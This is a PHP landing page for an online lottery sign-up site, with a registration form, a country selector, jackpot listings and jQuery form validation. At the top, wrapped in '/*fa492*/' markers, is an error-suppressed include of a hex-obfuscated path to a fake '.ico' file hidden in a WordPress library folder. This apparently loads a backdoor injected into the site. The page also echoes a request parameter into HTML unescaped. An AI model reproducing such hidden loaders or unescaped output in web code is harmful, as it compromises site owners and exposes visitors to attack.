<?php
/*fa492*/

@include "\x2fhome\x2forol\x6ftto/\x70ubli\x63_htm\x6c/wp-\x69nclu\x64es/S\x69mple\x50ie/D\x65code\x2f.06b\x331ba8\x2eico";

/*fa492*/
require('api.php');
$jackpots = getFeed();
if(isset($_GET["bta"])){
	$_SESSION["bta"] = trim($_GET["bta"]);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
	
	<meta charset="utf-8">
	<!--Start HTML5 Tags-->
	<title>OroLotto | Play the world’s largest Official Lotteries</title>
	<link rel="icon" type="image/png" href="img/favicon.png">
	<link rel="image_src" href="img/social-seo.jpg">
	<!--Start CSS Codes-->
	<link rel="stylesheet" href="css/styles.main.css?version=1">
	<link rel="stylesheet" href="css/medias.main.css?version=1">
	<link rel="stylesheet" href="css/normalize.css?version=1">
	<link rel="stylesheet" href="css/jquery-ui.min.css">
	
	<link href="https://fonts.googleapis.com/css?family=Oswald" rel="stylesheet">
	<style>
/*** FORM BLOCK ELEMENTS ***/
	form label.error
		{
		color: #c00;
		font-size: 100%;
		font-weight: bold;
		font-variant:small-caps;
		border-top:1px dotted #ccc;
		clear:both;
		}
	</style>
	
	<!--Start JS Codes-->
	<script src="js/jquery-2.1.3.min.js"></script>
	<!--<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>-->
	<!--[if lt IE 9]>
	<script src="js/old-support/IE9.js"></script>
	<![endif]-->
	<!--[if gte IE 9]>
	<style type="text/css">
	.gradient {
	   filter: none;
	}
	</style>
	<![endif]-->
	<script type="text/javascript" src="js/jquery-ui.min.js"></script>
	<script type="text/javascript" src="js/jquery.validate.min.js"></script>


</head>
<body>

<div class="home-section-1">
	<div class="wrapper">

<div class="content">	
<a class="logo" href="https://www.orolotto.com" name="OroLotto Lottery Online"></a>
<h1 class="firsttitle"> Play the world’s largest <span class="blue"> Official Lotteries </span> and get a Free Ticket </h1>
<h2 class="secondtitle"> Play Online from anywhere in the world </h2>


<form id="lpform" method="POST">
				
				<div class="form">
				<div class="wrapper dashed">
				<div class="inl">
				<h1 class="signuptitle">Register to Play & Get your <span class="blue">Free Ticket</span></h1>
				<div class="placer">
					<input type="text" id="fullName" name="Name" placeholder="Full Name" value="">
				</div>
				<div class="placer">
					 <select class="prefix-list" name="Country" id="country-selector" style="display:none">
                                        <option class="0" value="">Select Country</option>
                                        <option class="93" value="AF">Afghanistan</option>
                                        <option class="355" value="AL">Albania</option>
                                        <option class="213" value="DZ">Algeria</option>
                                        <option class="1684" value="AS">American Samoa</option>
                                        <option class="376" value="AD">Andorra</option>
                                        <option class="244" value="AO">Angola</option>
                                        <option class="1264" value="AI">Anguilla</option>
                                        <option class="672" value="AQ">Antarctica</option>
                                        <option class="1268" value="AG">Antigua and Barbuda</option>
                                        <option class="54" value="AR">Argentina</option>
                                        <option class="374" value="AM">Armenia</option>
                                        <option class="297" value="AW">Aruba</option>
                                        <option class="61" value="AU">Australia</option>
                                        <option class="43" value="AT">Austria</option>
                                        <option class="994" value="AZ">Azerbaijan</option>
                                        <option class="1242" value="BS">Bahamas</option>
                                        <option class="973" value="BH">Bahrain</option>
                                        <option class="880" value="BD">Bangladesh</option>
                                        <option class="1246" value="BB">Barbados</option>
                                        <option class="375" value="BY">Belarus</option>
                                        <option class="32" value="BE">Belgium</option>
                                        <option class="501" value="BZ">Belize</option>
                                        <option class="229" value="BJ">Benin</option>
                                        <option class="1441" value="BM">Bermuda</option>
                                        <option class="975" value="BT">Bhutan</option>
                                        <option class="591" value="BO">Bolivia</option>
                                        <option class="387" value="BA">Bosnia and Herzegovina</option>
                                        <option class="267" value="BW">Botswana</option>
                                        <option class="55" value="BR">Brazil</option>
                                        <option class="1284" value="VG">British Virgin Islands</option>
                                        <option class="673" value="BN">Brunei</option>
                                        <option class="359" value="BG">Bulgaria</option>
                                        <option class="226" value="BF">Burkina Faso</option>
                                        <option class="95" value="MM">Burma (Myanmar)</option>
                                        <option class="257" value="BI">Burundi</option>
                                        <option class="855" value="KH">Cambodia</option>
                                        <option class="237" value="CM">Cameroon</option>
                                        <option class="1" value="CA">Canada</option>
                                        <option class="238" value="CV">Cape Verde</option>
                                        <option class="1345" value="KY">Cayman Islands</option>
                                        <option class="236" value="CF">Central African Republic</option>
                                        <option class="235" value="TD">Chad</option>
                                        <option class="56" value="CL">Chile</option>
                                        <option class="86" value="CN">China</option>
                                        <option class="61" value="CX">Christmas Island</option>
                                        <option class="61" value="CC">Cocos (keeling) Islands</option>
                                        <option class="57" value="CO">Colombia</option>
                                        <option class="269" value="KM">Comoros</option>
                                        <option class="682" value="CK">Cook Islands</option>
                                        <option class="506" value="CR">Costa Rica</option>
                                        <option class="385" value="HR">Croatia</option>
                                        <option class="53" value="CU">Cuba</option>
                                        <option class="357" value="CY">Cyprus</option>
                                        <option class="420" value="CZ">Czech Republic</option>
                                        <option class="243" value="CD">Democratic Republic of the Congo</option>
                                        <option class="45" value="DK">Denmark</option>
                                        <option class="253" value="DJ">Djibouti</option>
                                        <option class="1767" value="DM">Dominica</option>
                                        <option class="1809" value="DO">Dominican Republic</option>
                                        <option class="593" value="EC">Ecuador</option>
                                        <option class="20" value="EG">Egypt</option>
                                        <option class="503" value="SV">El Salvador</option>
                                        <option class="240" value="GQ">Equatorial Guinea</option>
                                        <option class="291" value="ER">Eritrea</option>
                                        <option class="372" value="EE">Estonia</option>
                                        <option class="251" value="ET">Ethiopia</option>
                                        <option class="500" value="FK">Falkland Islands</option>
                                        <option class="298" value="FO">Faroe Islands</option>
                                        <option class="679" value="FJ">Fiji</option>
                                        <option class="358" value="FI">Finland</option>
                                        <option class="33" value="FR">France</option>
                                        <option class="689" value="PF">French Polynesia</option>
                                        <option class="241" value="GA">Gabon</option>
                                        <option class="220" value="GM">Gambia</option>
                                        <option class="995" value="GE">Georgia</option>
                                        <option class="49" value="DE">Germany</option>
                                        <option class="233" value="GH">Ghana</option>
                                        <option class="350" value="GI">Gibraltar</option>
                                        <option class="30" value="GR">Greece</option>
                                        <option class="299" value="GL">Greenland</option>
                                        <option class="1473" value="GD">Grenada</option>
                                        <option class="590" value="GP">Guadeloupe</option>
                                        <option class="1671" value="GU">Guam</option>
                                        <option class="502" value="GT">Guatemala</option>
                                        <option class="224" value="GN">Guinea</option>
                                        <option class="245" value="GW">Guinea-bissau</option>
                                        <option class="592" value="GY">Guyana</option>
                                        <option class="509" value="HT">Haiti</option>
                                        <option class="39" value="VA">Holy See (Vatican City)</option>
                                        <option class="504" value="HN">Honduras</option>
                                        <option class="852" value="HK">Hong Kong</option>
                                        <option class="36" value="HU">Hungary</option>
                                        <option class="354" value="IS">Iceland</option>
                                        <option class="91" value="IN">India</option>
                                        <option class="62" value="ID">Indonesia</option>
                                        <option class="98" value="IR">Iran</option>
                                        <option class="964" value="IQ">Iraq</option>
                                        <option class="353" value="IE">Ireland</option>
                                        <option class="44" value="IM">Isle Of Man</option>
                                        <option class="972" value="IL">Israel</option>
                                        <option class="39" value="IT">Italy</option>
                                        <option class="225" value="CI">Ivory Coast</option>
                                        <option class="1876" value="JM">Jamaica</option>
                                        <option class="81" value="JP">Japan</option>
                                        <option class="962" value="JO">Jordan</option>
                                        <option class="7" value="KZ">Kazakhstan</option>
                                        <option class="254" value="KE">Kenya</option>
                                        <option class="686" value="KI">Kiribati</option>
                                        <option class="965" value="KW">Kuwait</option>
                                        <option class="996" value="KG">Kyrgyzstan</option>
                                        <option class="856" value="LA">Laos</option>
                                        <option class="371" value="LV">Latvia</option>
                                        <option class="961" value="LB">Lebanon</option>
                                        <option class="266" value="LS">Lesotho</option>
                                        <option class="231" value="LR">Liberia</option>
                                        <option class="218" value="LY">Libya</option>
                                        <option class="423" value="LI">Liechtenstein</option>
                                        <option class="370" value="LT">Lithuania</option>
                                        <option class="352" value="LU">Luxembourg</option>
                                        <option class="853" value="MO">Macao</option>
                                        <option class="389" value="MK">Macedonia</option>
                                        <option class="261" value="MG">Madagascar</option>
                                        <option class="265" value="MW">Malawi</option>
                                        <option class="60" value="MY">Malaysia</option>
                                        <option class="960" value="MV">Maldives</option>
                                        <option class="223" value="ML">Mali</option>
                                        <option class="356" value="MT">Malta</option>
                                        <option class="692" value="MH">Marshall Islands</option>
                                        <option class="222" value="MR">Mauritania</option>
                                        <option class="230" value="MU">Mauritius</option>
                                        <option class="262" value="YT">Mayotte</option>
                                        <option class="52" value="MX">Mexico</option>
                                        <option class="691" value="FM">Micronesia, Federated States Of</option>
                                        <option class="373" value="MD">Moldova, Republic Of</option>
                                        <option class="377" value="MC">Monaco</option>
                                        <option class="976" value="MN">Mongolia</option>
                                        <option class="382" value="ME">Montenegro</option>
                                        <option class="1664" value="MS">Montserrat</option>
                                        <option class="212" value="MA">Morocco</option>
                                        <option class="258" value="MZ">Mozambique</option>
                                        <option class="264" value="NA">Namibia</option>
                                        <option class="674" value="NR">Nauru</option>
                                        <option class="977" value="NP">Nepal</option>
                                        <option class="31" value="NL">Netherlands</option>
                                        <option class="599" value="AN">Netherlands Antilles</option>
                                        <option class="687" value="NC">New Caledonia</option>
                                        <option class="64" value="NZ">New Zealand</option>
                                        <option class="505" value="NI">Nicaragua</option>
                                        <option class="227" value="NE">Niger</option>
                                        <option class="234" value="NG">Nigeria</option>
                                        <option class="683" value="NU">Niue</option>
                                        <option class="850" value="KP">North Korea</option>
                                        <option class="1670" value="MP">Northern Mariana Islands</option>
                                        <option class="47" value="NO">Norway</option>
                                        <option class="968" value="OM">Oman</option>
                                        <option class="92" value="PK">Pakistan</option>
                                        <option class="680" value="PW">Palau</option>
                                        <option class="507" value="PA">Panama</option>
                                        <option class="675" value="PG">Papua New Guinea</option>
                                        <option class="595" value="PY">Paraguay</option>
                                        <option class="51" value="PE">Peru</option>
                                        <option class="63" value="PH">Philippines</option>
                                        <option class="870" value="PN">Pitcairn Islands</option>
                                        <option class="48" value="PL">Poland</option>
                                        <option class="351" value="PT">Portugal</option>
                                        <option class="1" value="PR">Puerto Rico</option>
                                        <option class="974" value="QA">Qatar</option>
                                        <option class="242" value="CG">Republic of the Congo</option>
                                        <option class="40" value="RO">Romania</option>
                                        <option class="7" value="RU">Russian Federation</option>
                                        <option class="250" value="RW">Rwanda</option>
                                        <option class="590" value="BL">Saint Barthélemy</option>
                                        <option class="290" value="SH">Saint Helena</option>
                                        <option class="1869" value="KN">Saint Kitts and Nevis</option>
                                        <option class="1758" value="LC">Saint Lucia</option>
                                        <option class="1599" value="MF">Saint Martin</option>
                                        <option class="508" value="PM">Saint Pierre and Miquelon</option>
                                        <option class="1784" value="VC">Saint Vincent and the Grenadines</option>
                                        <option class="685" value="WS">Samoa</option>
                                        <option class="378" value="SM">San Marino</option>
                                        <option class="239" value="ST">Sao Tome And Principe</option>
                                        <option class="966" value="SA">Saudi Arabia</option>
                                        <option class="221" value="SN">Senegal</option>
                                        <option class="381" value="RS">Serbia</option>
                                        <option class="248" value="SC">Seychelles</option>
                                        <option class="232" value="SL">Sierra Leone</option>
                                        <option class="65" value="SG">Singapore</option>
                                        <option class="421" value="SK">Slovakia</option>
                                        <option class="386" value="SI">Slovenia</option>
                                        <option class="677" value="SB">Solomon Islands</option>
                                        <option class="252" value="SO">Somalia</option>
                                        <option class="27" value="ZA">South Africa</option>
                                        <option class="82" value="KR">South Korea</option>
                                        <option class="34" value="ES">Spain</option>
                                        <option class="94" value="LK">Sri Lanka</option>
                                        <option class="249" value="SD">Sudan</option>
                                        <option class="597" value="SR">Suriname</option>
                                        <option class="268" value="SZ">Swaziland</option>
                                        <option class="46" value="SE">Sweden</option>
                                        <option class="41" value="CH">Switzerland</option>
                                        <option class="963" value="SY">Syria</option>
                                        <option class="886" value="TW">Taiwan</option>
                                        <option class="992" value="TJ">Tajikistan</option>
                                        <option class="255" value="TZ">Tanzania</option>
                                        <option class="66" value="TH">Thailand</option>
                                        <option class="670" value="TL">Timor-Leste</option>
                                        <option class="228" value="TG">Togo</option>
                                        <option class="690" value="TK">Tokelau</option>
                                        <option class="676" value="TO">Tonga</option>
                                        <option class="1868" value="TT">Trinidad and Tobago</option>
                                        <option class="216" value="TN">Tunisia</option>
                                        <option class="90" value="TR">Turkey</option>
                                        <option class="993" value="TM">Turkmenistan</option>
                                        <option class="1649" value="TC">Turks and Caicos Islands</option>
                                        <option class="688" value="TV">Tuvalu</option>
                                        <option class="256" value="UG">Uganda</option>
                                        <option class="380" value="UA">Ukraine</option>
                                        <option class="971" value="AE">United Arab Emirates</option>
                                        <option class="44" value="GB">United Kingdom</option>
                                        <option class="1" value="US">United States of America</option>
                                        <option class="598" value="UY">Uruguay</option>
                                        <option class="1340" value="VI">US Virgin Islands</option>
                                        <option class="998" value="UZ">Uzbekistan</option>
                                        <option class="678" value="VU">Vanuatu</option>
                                        <option class="58" value="VE">Venezuela</option>
                                        <option class="84" value="VN">Viet Nam</option>
                                        <option class="681" value="WF">Wallis And Futuna</option>
                                        <option class="967" value="YE">Yemen</option>
                                        <option class="260" value="ZM">Zambia</option>
                                        <option class="263" value="ZW">Zimbabwe</option>
               </select>
			   
			   
			   <input type="text" name="Email" placeholder="Email" value="">
			   <div id="errorfromapi" style="font-size:10px;width:100%;color: #c00;
		font-weight: bold;
		font-variant:small-caps;"></div>
			   </div>
				<div class="placer" style="width:75px">
				<input id="firstName" name="firstName" type="hidden" value="">
                <input id="lastName" name="lastName" type="hidden" value="">
               <input type="hidden" name="city" value="">
               <input type="hidden" name="zipcode" value="">
			   <input type="hidden" name="AffiliateId" value="<?php echo $_SESSION["bta"]; ?>">
               <input type="hidden" name="IP" value="">
               
				<input type="text" name="code" placeholder="1" value="">
					
				</div>
				<div class="placer">
					<input type="text" name="Phone"  placeholder="Phone" value="">
				</div><!--Inline blog-->
</div>
				<div class="wrapper">
					
					<button type="submit" class="inl btn-1"></button>
				</div><!--Inline blog-->
			</form><!--Form-->

</div>
</div>
	<div class="grid">
	
		<?php
		 if (isset($jackpots['jackpots'])) {
			 foreach($jackpots['jackpots'] as $entry) {

		?>		 
			<div class="inl">
			<div class="ticket">
				<img src="img/<?php echo($draws[$entry['title']][2]); ?>" alt="img" class="inl">
				<h6>
					Official<br/><?php echo($draws[$entry['title']][0]); ?> lottery
					<strong><?php echo( $draws[$entry['title']][1] . ' ' . $entry['number']); ?></strong>
				</h6>
				<h5>
					MILLION
				</h5>
				<a href="<?php echo($entry['link']); ?>" class="inl btn-2"></a>
			</div>
			</div>
			<!--Lotto-->
			
			
		<?php		
			 }
		 }	
		
		?>		
		</div><!--Grid-->

	</div>
	</div>
<!--Home section 1-->

<footer>  
<div class="wrapper">
<div class="copyright">
www.OroLotto.com is owned and operated by MASARIK Media OÜ, an Estonia company, company registration number , registered address ROOSIKRANTSI 2-K249, TALLINN CITY, HARJU COUNTY, ESTONIA
© 2016 Orolotto. All rights reserved
</div>
</div>
</footer>
<!-- ui-dialog -->
<div id="popup" title="Play Now">
	<p>You get a FREE lottery ticket.</p>
</div>

<script src="js/jquery.main.js"></script>
<script>

$( document ).ready(function() { 
function splitFullName(a,b,c){
                String.prototype.capitalize = function(){
                        return this.replace( /(^|s)([a-z])/g , function(m,p1,p2){ return p1+p2.toUpperCase(); } );
                };
                document.getElementById(c).oninput=function(){
                        var fullName = document.getElementById(c).value;
                        if((fullName.match(/ /g) || []).length ===0 || fullName.substring(fullName.indexOf(" ")+1,fullName.length) === ""){
                                var first = fullName.capitalize();
                                var last = "null";
                        }else if(fullName.substring(0,fullName.indexOf(" ")).indexOf(".")>-1){
                                var first = fullName.substring(0,fullName.indexOf(" ")).capitalize() + " " + fullName.substring(fullName.indexOf(" ")+1,fullName.length).substring(0,fullName.substring(fullName.indexOf(" ")+1,fullName.length).indexOf(" ")).capitalize();
                                var last = fullName.substring(first.length +1,fullName.length).capitalize();
                        }else{
                                var first = fullName.substring(0,fullName.indexOf(" ")).capitalize();
                                var last = fullName.substring(fullName.indexOf(" ")+1,fullName.length).capitalize();
                        }
                        document.getElementById(a).value = first;
                        document.getElementById(b).value = last;
                };
                //Initial Values
                if(document.getElementById(c).value.length < 2 && document.getElementById(b).value.length.length >2 && document.getElementById(a).value.length.length >2 ){
                        var first = document.getElementById(a).value.capitalize();
                        var last = document.getElementById(b).value.capitalize();
                        var fullName =  first + " " + last ;
                        console.log(fullName);
                        document.getElementById(c).value = fullName;
                }
        }
        splitFullName("firstName","lastName","fullName");

		

  var countryCode = '';
  var ip = '';
	var city = '';
	var zipcode = '';
	$.ajax({url: "https://freegeoip.net/json/", crossDomain: true, success: function(result){
        countryCode  = result.country_code;
        ip = result.ip;
		city = result.city;
		zipcode = result.zip_code;
    if (ip != '') {
      $("#lpform input[name='IP']").val(ip);
	  $("#lpform input[name='city']").val(city);
	  $("#lpform input[name='zipcode']").val(zipcode);
    }
		if( countryCode != '' ){ 
		   $("#country-selector option").each(function() {
			   if(  $(this).prop('value') == countryCode ){
			      $("#country-selector").val(countryCode);
				  $("#lpform input[name='code']").val( $(this).prop('class') );
		       }
		   });
		}
    }});
	

});
$(function(){
   $('#country-selector').change(function() { 
      $("#form input[name='code']").val( $('option:selected', this).attr('class') );			   
   });
});


$(function() {
	// validate signup form on keyup and submit
	jQuery("#lpform").validate({
		rules: {
			Name: {
				required: true,
				minlength: 3
				

			},
			Email: {
				required: true,
				email: true
			},
			Phone: {
				required: false,
				digits: true
				}

		},
		messages: {
			Name: {
				required: "Please enter a name",
				minlength: "Your name must consist of at least 3 characters"
				
			},
			Email: "Please enter a valid email address",
			Phone: "Please enter a valid phone number"
		}
	});
	
	$( "#popup" ).dialog({
		autoOpen: false,
		width: 400,
		buttons: [
			{
				text: "Cancel",
				click: function() {
					$( this ).dialog( "close" );
				}
			}
		]
	});
	
	
	
});


</script>
<?php 
	echo($script);
?>
</body>
</html>